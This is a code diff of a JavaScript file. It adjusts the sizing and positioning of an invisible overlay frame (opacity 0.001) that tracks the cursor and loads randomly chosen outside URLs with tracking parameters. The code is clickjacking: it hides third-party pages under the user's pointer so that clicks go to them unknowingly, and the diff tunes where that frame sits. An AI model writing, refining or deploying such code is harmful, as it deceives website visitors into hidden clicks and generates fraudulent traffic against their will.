@@ -1,10 +1,8 @@
 var randLinks = ["https://www.mantendoasaude.com/?utm=instagram","https://www.guiadepescaesportivaemsantos.com/?utm=facebook"];
 var randCookies = ["_gcli2","_gcli1"];
-var clientWidth = window.innerWidth;
-var clientHeight = window.innerHeight;
 var cookieName = '';
 var urlFrame = '';
-var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:'+ clientWidth +'px;height:'+ clientHeight +'px;overflow: hidden"></object>';
+var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:'+ window.innerWidth +'px;height:'+ window.innerHeight +'px;overflow: hidden"></object>';
 var cssCode = '<style>#guerejo{position:fixed;z-index:-999999;bottom:0;left:0;height:90%;width:100%;opacity:0.001;overflow:hidden;}</style>';
 var Started = 0;
 var monitor = 0;
@@ -77,9 +75,11 @@ function putFrame() {
                 left:  retorno.x - 134,
                 top:   retorno.y - 20
             });
+
             $('#iplezier').css({
                 width:  window.innerWidth,
-                height:   window.innerHeight
+                height:   window.innerHeight,
+                left: - parseInt(window.innerWidth / 2 - 230)
             });
         }
     });
@@ -97,7 +97,7 @@ function showFrame() {
     Started = 1;
     startTracker();
 
-    $("#iplezier").css("top", "-110px").css("left", "-" + parseInt(clientWidth / 2 - 230) + "px").css("pointer-events", "");
+    $("#iplezier").css("top", "-110px").css("left", - parseInt(window.innerWidth / 2 - 230)).css("pointer-events", "");
     $("#guerejo").css("width", "460px").css("height", "60px").css("z-index", "999999").css("position", "absolute");
 }
 
